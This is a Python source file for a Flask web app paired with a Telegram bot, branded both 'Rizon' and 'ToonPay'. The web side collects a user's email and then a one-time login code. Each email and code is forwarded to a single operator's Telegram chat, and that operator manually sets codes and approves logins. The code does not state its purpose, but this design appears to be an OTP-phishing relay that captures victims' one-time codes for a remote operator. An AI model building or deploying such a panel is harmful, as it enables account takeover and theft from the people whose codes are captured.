import os
import threading
import uuid
from flask import Flask, request, jsonify, render_template
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))

# 🔴 IMPORTANT: Apna Railway ka public URL yahan daalein
# Example: "https://rizon-bot-production.up.railway.app"
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.up.railway.app")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- Temporary Storage (In-Memory) ---
sessions = {}
admin_msg_to_session = {}

# --- Frontend Route ---
@app.route('/')
def index():
    return render_template('index.html')

# --- API Endpoints ---

@app.route('/api/request-otp', methods=['POST'])
def request_otp():
    data = request.json
    email = data.get('email')
    
    if not email:
        return jsonify({"error": "Email required"}), 400
    
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        'email': email,
        'admin_otp': None,
        'user_otp': None,
        'status': 'pending_admin_otp'
    }
    
    try:
        msg = bot.send_message(
            ADMIN_ID, 
            f"🔔 *New Login Request*\n\nUser: `{email}`\n\nPlease reply to this message with the OTP you want to assign.",
            parse_mode='Markdown'
        )
        admin_msg_to_session[msg.message_id] = session_id
    except Exception as e:
        print(f"Telegram Error: {e}")
        return jsonify({"error": "Failed to notify admin"}), 500
    
    return jsonify({"session_id": session_id, "message": "OTP requested"})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    session_id = data.get('session_id')
    user_otp = data.get('otp')
    
    if session_id not in sessions:
        return jsonify({"error": "Invalid session"}), 400
    
    sessions[session_id]['user_otp'] = user_otp
    sessions[session_id]['status'] = 'pending_admin_confirm'
    
    email = sessions[session_id]['email']
    admin_otp = sessions[session_id]['admin_otp']
    
    markup = InlineKeyboardMarkup()
    btn_correct = InlineKeyboardButton("✅ Confirm (Correct)", callback_data=f"confirm_{session_id}")
    btn_wrong = InlineKeyboardButton("❌ Reject (Wrong)", callback_data=f"reject_{session_id}")
    markup.add(btn_correct, btn_wrong)
    
    try:
        bot.send_message(
            ADMIN_ID,
            f"🔐 *OTP Verification*\n\nUser: `{email}`\nAdmin OTP: `{admin_otp}`\nUser OTP: `{user_otp}`\n\nIs the OTP correct?",
            reply_markup=markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Telegram Error: {e}")
    
    return jsonify({"message": "OTP sent for verification"})

@app.route('/api/check-status/<session_id>', methods=['GET'])
def check_status(session_id):
    if session_id not in sessions:
        return jsonify({"error": "Invalid session"}), 400
    
    return jsonify({"status": sessions[session_id]['status']})

# --- Telegram Bot Handlers ---

# 🔥 NEW: /start command handler (works in both Private & Group chats)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Inline keyboard with Web App button
    markup = InlineKeyboardMarkup()
    
    # WebAppInfo object for the Mini App button
    web_app_info = telebot.types.WebAppInfo(url=WEBAPP_URL)
    btn_open_app = InlineKeyboardButton(
        text="🚀 Open Rizon App", 
        web_app=web_app_info
    )
    markup.add(btn_open_app)
    
    welcome_text = (
        "👋 *Welcome to Rizon!*\n\n"
        "Tap the button below to open the *Rizon* app and get started."
    )
    
    # Send message with inline button
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.reply_to_message is not None and message.chat.id == ADMIN_ID)
def handle_admin_otp_reply(message):
    replied_msg_id = message.reply_to_message.message_id
    if replied_msg_id in admin_msg_to_session:
        session_id = admin_msg_to_session[replied_msg_id]
        admin_otp = message.text.strip()
        
        if session_id in sessions:
            sessions[session_id]['admin_otp'] = admin_otp
            sessions[session_id]['status'] = 'pending_user_otp'
            bot.reply_to(message, f"✅ OTP `{admin_otp}` set for user. Waiting for user to enter it.", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Session expired or invalid.")

@bot.callback_query_handler(func=lambda call: True)
def handle_admin_decision(call):
    data = call.data
    action, session_id = data.split('_', 1)
    
    if session_id not in sessions:
        bot.answer_callback_query(call.id, "Session expired!")
        return
        
    if action == "confirm":
        sessions[session_id]['status'] = 'approved'
        bot.edit_message_text("✅ User Approved. Login successful.", call.message.chat.id, call.message.message_id)
    elif action == "reject":
        sessions[session_id]['status'] = 'rejected'
        bot.edit_message_text("❌ User Rejected. OTP was incorrect.", call.message.chat.id, call.message.message_id)
    
    bot.answer_callback_query(call.id)

# --- Run Bot in Background Thread ---
def run_bot():
    print("Bot is polling...")
    
    # Optional: Set bot commands menu
    try:
        bot.set_my_commands([
            telebot.types.BotCommand("start", "🚀 Open ToonPay App")
        ])
    except Exception as e:
        print(f"Could not set commands: {e}")
    
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
